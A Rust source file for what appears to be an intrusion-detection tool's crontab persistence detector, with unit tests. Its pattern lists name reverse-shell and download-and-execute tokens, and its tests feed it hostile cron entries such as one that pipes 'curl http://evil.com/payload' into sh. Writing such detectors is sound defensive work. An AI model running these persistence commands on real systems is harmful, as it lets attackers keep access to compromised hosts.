use std::collections::HashMap;

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{event::Event, event::Severity, incident::Incident};

/// Processes that legitimately modify crontabs.
const ALLOWED_PROCESSES: &[&str] = &[
    "cron",
    "anacron",
    "logrotate",
    "apt",
    "apt-get",
    "dpkg",
    "unattended-upgrades",
    "unattended-upgrade",
    "yum",
    "dnf",
    "rpm",
];

/// Crontab file/directory paths that indicate persistence.
const CRON_PATHS: &[&str] = &[
    "/var/spool/cron/crontabs/",
    "/var/spool/cron/",
    "/etc/cron.d/",
    "/etc/crontab",
    "/etc/cron.daily/",
    "/etc/cron.hourly/",
    "/etc/cron.weekly/",
    "/etc/cron.monthly/",
];

/// Single-token patterns that indicate suspicious crontab content.
const SUSPICIOUS_SINGLE_PATTERNS: &[&str] = &[
    "/dev/tcp",
    "base64 -d",
    "base64 --decode",
    "python -c",
    "python3 -c",
    "perl -e",
    "nc -e",
    "ncat -e",
    "bash -i",
];

/// Paired patterns: both must appear in the command (download + execute combos).
const SUSPICIOUS_PAIRS: &[(&str, &str)] = &[
    ("curl", "| sh"),
    ("curl", "|sh"),
    ("curl", "| bash"),
    ("curl", "|bash"),
    ("wget", "| sh"),
    ("wget", "|sh"),
    ("wget", "| bash"),
    ("wget", "|bash"),
];

/// Detects crontab modifications used for persistence.
///
/// Attackers commonly install crontab entries to maintain persistence on
/// compromised systems. This detector catches:
/// - File writes to crontab directories
/// - Commands that edit or pipe to crontab
/// - Commands that append to cron files via echo/redirection
/// - File creation in /etc/cron.{daily,hourly,weekly}/
///
/// Legitimate system processes (cron, apt, logrotate) are allowlisted.
pub struct CrontabPersistenceDetector {
    cooldown: Duration,
    alerted: HashMap<String, DateTime<Utc>>,
    host: String,
}

impl CrontabPersistenceDetector {
    pub fn new(host: impl Into<String>, cooldown_seconds: u64) -> Self {
        Self {
            cooldown: Duration::seconds(cooldown_seconds as i64),
            alerted: HashMap::new(),
            host: host.into(),
        }
    }

    /// Check if the process name is in the allowlist.
    fn is_allowed_process(comm: &str) -> bool {
        ALLOWED_PROCESSES
            .iter()
            .any(|p| comm == *p || comm.starts_with(p))
    }

    /// Check if a file path is a cron-related path.
    fn is_cron_path(path: &str) -> bool {
        CRON_PATHS.iter().any(|p| path.starts_with(p))
    }

    /// Check if the command is a crontab modification command.
    fn is_crontab_command(command: &str) -> bool {
        let lower = command.to_lowercase();

        // Any crontab execution as standalone command (binary path or bare command).
        // eBPF execve may capture just the binary without args when piped via stdin.
        // Only match when the entire command IS crontab (no args after it = reading crontab file).
        if lower == "crontab" || lower == "/usr/bin/crontab" || lower == "/usr/local/bin/crontab" {
            return true;
        }

        // crontab -e or crontab - (pipe)
        if lower.contains("crontab -e") || lower.contains("crontab -") {
            return true;
        }

        // echo ... >> ... cron pattern
        if (lower.contains("echo") || lower.contains("printf"))
            && lower.contains(">>")
            && lower.contains("cron")
        {
            return true;
        }

        // Direct write to cron paths via redirection
        if lower.contains(">") {
            for path in CRON_PATHS {
                if lower.contains(path) {
                    return true;
                }
            }
        }

        false
    }

    /// Check if the command contains suspicious content (download+execute, reverse shells).
    fn has_suspicious_content(command: &str) -> bool {
        let lower = command.to_lowercase();
        if SUSPICIOUS_SINGLE_PATTERNS.iter().any(|p| lower.contains(p)) {
            return true;
        }
        SUSPICIOUS_PAIRS
            .iter()
            .any(|(a, b)| lower.contains(a) && lower.contains(b))
    }

    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        let comm = event.details["comm"]
            .as_str()
            .unwrap_or("unknown")
            .to_string();

        // Skip allowlisted processes
        if Self::is_allowed_process(&comm) {
            return None;
        }

        let now = event.ts;

        match event.kind.as_str() {
            "file.write_access" => {
                let path = event.details["path"].as_str().unwrap_or("");
                if path.is_empty() || !Self::is_cron_path(path) {
                    return None;
                }

                let pid = event.details["pid"].as_u64().unwrap_or(0) as u32;
                let uid = event.details["uid"].as_u64().unwrap_or(0) as u32;

                let alert_key = format!("cron_file:{}:{}", path, comm);
                if self.is_in_cooldown(&alert_key, now) {
                    return None;
                }
                self.alerted.insert(alert_key, now);

                self.prune_stale(now);

                Some(Incident {
                    ts: now,
                    host: self.host.clone(),
                    incident_id: format!(
                        "crontab_persistence:{}:{}:{}",
                        comm,
                        path,
                        now.format("%Y-%m-%dT%H:%MZ")
                    ),
                    severity: Severity::High,
                    title: format!("Crontab modification detected: {path}"),
                    summary: format!(
                        "Crontab persistence: {comm} (pid={pid}, uid={uid}) wrote to {path}"
                    ),
                    evidence: serde_json::json!([{
                        "kind": "crontab_write",
                        "path": path,
                        "comm": comm,
                        "pid": pid,
                        "uid": uid,
                    }]),
                    recommended_checks: vec![
                        format!("Inspect crontab file: cat {path}"),
                        format!("Check who modified it: stat {path}"),
                        format!("Review process tree: ps -o ppid= -p {pid}"),
                        "List all user crontabs: for u in $(cut -f1 -d: /etc/passwd); do echo \"$u:\"; crontab -l -u $u 2>/dev/null; done".to_string(),
                        "If unexpected: remove the crontab entry and investigate".to_string(),
                    ],
                    tags: vec![
                        "persistence".to_string(),
                        "crontab".to_string(),
                    ],
                    entities: vec![],
                })
            }
            "shell.command_exec" => {
                let command = event.details["command"].as_str().unwrap_or("");
                if command.is_empty() || !Self::is_crontab_command(command) {
                    return None;
                }

                let pid = event.details["pid"].as_u64().unwrap_or(0) as u32;
                let uid = event.details["uid"].as_u64().unwrap_or(0) as u32;

                let alert_key = format!("cron_cmd:{}:{}", comm, pid);
                if self.is_in_cooldown(&alert_key, now) {
                    return None;
                }
                self.alerted.insert(alert_key, now);

                let severity = if Self::has_suspicious_content(command) {
                    Severity::Critical
                } else {
                    Severity::High
                };

                let summary = if severity == Severity::Critical {
                    format!(
                        "Suspicious crontab persistence: {comm} (pid={pid}, uid={uid}) executed: {command}"
                    )
                } else {
                    format!(
                        "Crontab modification via command: {comm} (pid={pid}, uid={uid}) executed: {command}"
                    )
                };

                self.prune_stale(now);

                Some(Incident {
                    ts: now,
                    host: self.host.clone(),
                    incident_id: format!(
                        "crontab_persistence:{}:{}:{}",
                        comm,
                        pid,
                        now.format("%Y-%m-%dT%H:%MZ")
                    ),
                    severity,
                    title: format!("Crontab modification via command: {comm}"),
                    summary,
                    evidence: serde_json::json!([{
                        "kind": "crontab_command",
                        "command": command,
                        "comm": comm,
                        "pid": pid,
                        "uid": uid,
                    }]),
                    recommended_checks: vec![
                        "List all crontabs: crontab -l".to_string(),
                        format!("Investigate process {comm} (pid={pid})"),
                        "Check /etc/cron.d/ for new entries: ls -la /etc/cron.d/".to_string(),
                        "If suspicious: remove the crontab entry and kill the process".to_string(),
                    ],
                    tags: vec!["persistence".to_string(), "crontab".to_string()],
                    entities: vec![],
                })
            }
            _ => None,
        }
    }

    fn is_in_cooldown(&self, key: &str, now: DateTime<Utc>) -> bool {
        if let Some(&last) = self.alerted.get(key) {
            now - last < self.cooldown
        } else {
            false
        }
    }

    fn prune_stale(&mut self, now: DateTime<Utc>) {
        if self.alerted.len() > 500 {
            let cutoff = now - self.cooldown;
            self.alerted.retain(|_, ts| *ts > cutoff);
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn file_write_event(path: &str, comm: &str, pid: u32, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "file.write_access".to_string(),
            severity: Severity::Info,
            summary: format!("File write: {path}"),
            details: serde_json::json!({
                "pid": pid,
                "uid": 1000,
                "comm": comm,
                "path": path,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn command_event(command: &str, comm: &str, pid: u32, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "shell.command_exec".to_string(),
            severity: Severity::Info,
            summary: format!("Shell command: {command}"),
            details: serde_json::json!({
                "pid": pid,
                "uid": 1000,
                "comm": comm,
                "command": command,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    #[test]
    fn detects_crontab_file_write() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        let inc = det.process(&file_write_event(
            "/var/spool/cron/crontabs/root",
            "vi",
            1234,
            now,
        ));
        assert!(inc.is_some());
        let inc = inc.unwrap();
        assert_eq!(inc.severity, Severity::High);
        assert!(inc.title.contains("/var/spool/cron/crontabs/root"));
        assert!(inc.tags.contains(&"persistence".to_string()));
        assert!(inc.tags.contains(&"crontab".to_string()));
    }

    #[test]
    fn detects_etc_cron_d_write() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        let inc = det.process(&file_write_event("/etc/cron.d/backdoor", "bash", 1234, now));
        assert!(inc.is_some());
        assert!(inc.unwrap().title.contains("/etc/cron.d/backdoor"));
    }

    #[test]
    fn detects_cron_daily_write() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        let inc = det.process(&file_write_event(
            "/etc/cron.daily/malware",
            "python3",
            1234,
            now,
        ));
        assert!(inc.is_some());
        assert!(inc.unwrap().title.contains("/etc/cron.daily/malware"));
    }

    #[test]
    fn detects_crontab_edit_command() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        let inc = det.process(&command_event("crontab -e", "bash", 1234, now));
        assert!(inc.is_some());
        let inc = inc.unwrap();
        assert_eq!(inc.severity, Severity::High);
    }

    #[test]
    fn detects_echo_cron_append() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        let inc = det.process(&command_event(
            "echo '* * * * * /tmp/backdoor' >> /etc/cron.d/evil",
            "bash",
            1234,
            now,
        ));
        assert!(inc.is_some());
        let inc = inc.unwrap();
        assert_eq!(inc.severity, Severity::High);
    }

    #[test]
    fn critical_for_suspicious_content() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        let inc = det.process(&command_event(
            "echo '* * * * * curl http://evil.com/payload|sh' | crontab -",
            "bash",
            1234,
            now,
        ));
        assert!(inc.is_some());
        let inc = inc.unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.summary.contains("Suspicious"));
    }

    #[test]
    fn allows_system_processes() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        assert!(det
            .process(&file_write_event(
                "/var/spool/cron/crontabs/root",
                "cron",
                100,
                now
            ))
            .is_none());
        assert!(det
            .process(&file_write_event("/etc/cron.d/apt-compat", "apt", 101, now))
            .is_none());
        assert!(det
            .process(&file_write_event(
                "/etc/cron.daily/logrotate",
                "logrotate",
                102,
                now
            ))
            .is_none());
        assert!(det
            .process(&file_write_event("/etc/cron.d/dpkg", "dpkg", 103, now))
            .is_none());
    }

    #[test]
    fn cooldown_suppresses_realert() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        assert!(det
            .process(&command_event("crontab -e", "bash", 1234, now))
            .is_some());
        assert!(det
            .process(&command_event(
                "crontab -e",
                "bash",
                1234,
                now + Duration::seconds(10)
            ))
            .is_none());
    }

    #[test]
    fn ignores_non_cron_file_writes() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        assert!(det
            .process(&file_write_event("/etc/passwd", "vi", 1234, now))
            .is_none());
        assert!(det
            .process(&file_write_event("/tmp/test.txt", "bash", 1235, now))
            .is_none());
    }

    #[test]
    fn ignores_non_cron_commands() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        assert!(det
            .process(&command_event("ls -la /tmp", "bash", 1234, now))
            .is_none());
        assert!(det
            .process(&command_event("cat /etc/crontab", "cat", 1235, now))
            .is_none());
    }

    #[test]
    fn detects_crontab_pipe_command() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        let inc = det.process(&command_event(
            "echo '*/5 * * * * /usr/local/bin/update' | crontab -",
            "bash",
            1234,
            now,
        ));
        assert!(inc.is_some());
    }

    #[test]
    fn critical_for_base64_decode_in_cron() {
        let mut det = CrontabPersistenceDetector::new("test", 300);
        let now = Utc::now();

        let inc = det.process(&command_event(
            "echo '* * * * * echo dGVzdA== | base64 -d | bash' | crontab -",
            "bash",
            1234,
            now,
        ));
        assert!(inc.is_some());
        assert_eq!(inc.unwrap().severity, Severity::Critical);
    }
}
